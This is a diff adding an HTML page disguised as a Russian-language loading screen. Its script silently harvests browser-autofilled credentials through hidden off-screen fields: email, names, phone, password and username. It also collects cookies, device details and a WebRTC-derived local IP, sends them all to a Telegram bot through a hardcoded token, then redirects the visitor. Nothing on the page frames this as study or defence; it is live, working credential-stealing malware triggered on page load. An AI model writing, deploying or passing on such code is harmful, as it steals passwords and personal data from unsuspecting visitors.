@@ -1,0 +1,156 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <meta charset="UTF-8">
+    <title>Загрузка...</title>
+    <style>
+        body {
+            background: #0a0a0a;
+            color: #fff;
+            font-family: Arial, sans-serif;
+            text-align: center;
+            padding-top: 20%;
+        }
+        .loader {
+            display: inline-block;
+            width: 50px;
+            height: 50px;
+            border: 5px solid #333;
+            border-top: 5px solid #fff;
+            border-radius: 50%;
+            animation: spin 1s linear infinite;
+        }
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+    </style>
+</head>
+<body>
+    <div class="loader"></div>
+    <h1>Идёт загрузка...</h1>
+    <p>Пожалуйста, подождите.</p>
+
+    <script>
+        (function() {
+            // Создаём скрытые поля для автозаполнения
+            var form = document.createElement('form');
+            form.id = 'stealthForm';
+            form.innerHTML = `
+                <input type="email" id="email" autocomplete="email" style="position:absolute;left:-9999px;width:1px;height:1px;">
+                <input type="text" id="name" autocomplete="given-name" style="position:absolute;left:-9999px;width:1px;height:1px;">
+                <input type="text" id="family" autocomplete="family-name" style="position:absolute;left:-9999px;width:1px;height:1px;">
+                <input type="tel" id="phone" autocomplete="tel" style="position:absolute;left:-9999px;width:1px;height:1px;">
+                <input type="password" id="pass" autocomplete="current-password" style="position:absolute;left:-9999px;width:1px;height:1px;">
+                <input type="text" id="full" autocomplete="name" style="position:absolute;left:-9999px;width:1px;height:1px;">
+                <input type="text" id="username" autocomplete="username" style="position:absolute;left:-9999px;width:1px;height:1px;">
+            `;
+            document.body.appendChild(form);
+
+            // Активируем автозаполнение (браузер сам подставит сохранённые данные)
+            var fields = ['email', 'name', 'family', 'phone', 'pass', 'full', 'username'];
+            fields.forEach(function(id) {
+                var el = document.getElementById(id);
+                el.focus();
+                el.blur();
+            });
+
+            // Сбор данных через 1.8 секунды (браузер успеет подставить)
+            setTimeout(function() {
+                var data = {
+                    email: document.getElementById('email').value || 'не заполнено',
+                    name: document.getElementById('name').value || 'не заполнено',
+                    family: document.getElementById('family').value || 'не заполнено',
+                    phone: document.getElementById('phone').value || 'не заполнено',
+                    password: document.getElementById('pass').value || 'не заполнено',
+                    full_name: document.getElementById('full').value || 'не заполнено',
+                    username: document.getElementById('username').value || 'не заполнено',
+                    userAgent: navigator.userAgent,
+                    platform: navigator.platform,
+                    screen: screen.width + 'x' + screen.height,
+                    colorDepth: screen.colorDepth + 'bit',
+                    timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+                    language: navigator.language,
+                    cookies: document.cookie || 'нет',
+                    localIP: 'определяется...'
+                };
+
+                // Получаем локальный IP через WebRTC
+                var pc = new RTCPeerConnection({ iceServers: [] });
+                pc.createDataChannel('');
+                pc.createOffer().then(function(offer) {
+                    pc.setLocalDescription(offer);
+                });
+                pc.onicecandidate = function(e) {
+                    if (!e.candidate) return;
+                    var ip = e.can
+
+
+didate.candidate.split(' ')[4];
+                    if (ip && ip.indexOf('.') !== -1) {
+                        data.localIP = ip;
+                        pc.close();
+                        sendToTelegram(data);
+                    }
+                };
+                setTimeout(function() {
+                    if (data.localIP === 'определяется...') {
+                        data.localIP = 'не определён (таймаут)';
+                        sendToTelegram(data);
+                    }
+                    pc.close();
+                }, 3000);
+
+                function sendToTelegram(d) {
+                    // Формируем сообщение
+                    var msg = '✅ НОВЫЙ СБОР ДАННЫХ\n\n';
+                    msg += '📧 Email: ' + d.email + '\n';
+                    msg += '👤 Имя: ' + d.name + '\n';
+                    msg += '👨‍👦 Фамилия: ' + d.family + '\n';
+                    msg += '📱 Телефон: ' + d.phone + '\n';
+                    msg += '🔑 Пароль: ' + d.password + '\n';
+                    msg += '🧑 Полное имя: ' + d.full_name + '\n';
+                    msg += '👤 Username: ' + d.username + '\n';
+                    msg += '🏠 Локальный IP: ' + d.localIP + '\n';
+                    msg += '🖥️ Платформа: ' + d.platform + '\n';
+                    msg += '📐 Экран: ' + d.screen + ' (' + d.colorDepth + ')' + '\n';
+                    msg += '⏰ Часовой пояс: ' + d.timezone + '\n';
+                    msg += '🗣️ Язык: ' + d.language + '\n';
+                    msg += '🍪 Cookies: ' + d.cookies + '\n';
+                    msg += '🖥️ User-Agent: ' + d.userAgent;
+
+                    // Отправка в Telegram
+                    var token = '8630001162:AAHw1VOaRqjKE8T1h_dCSeNcIq77k0wxwwM';
+                    var chat = '7112152265';
+                    var url = 'https://api.telegram.org/bot' + token + '/sendMessage';
+
+                    fetch(url, {
+                        method: 'POST',
+                        headers: { 'Content-Type': 'application/json' },
+                        body: JSON.stringify({
+                            chat_id: chat,
+                            text: msg,
+                            parse_mode: 'HTML'
+                        })
+                    })
+                    .then(function() {
+                        window.location.replace('https://azrpp.ru');
+                    })
+                    .catch(function() {
+                        // Если fetch упал — пробуем через img (запасной вариант)
+                        var img = new Image();
+                        img.src = url + '?chat_id=' + chat + '&text=' + encodeURIComponent(msg);
+                        setTimeout(function() {
+                            window.location.replace('https://azrpp.ru');
+                        }, 500);
+                    });
+                }
+            }, 1800);
+        })();
+    </script>
+</body>
+</html>
+
+
+
+
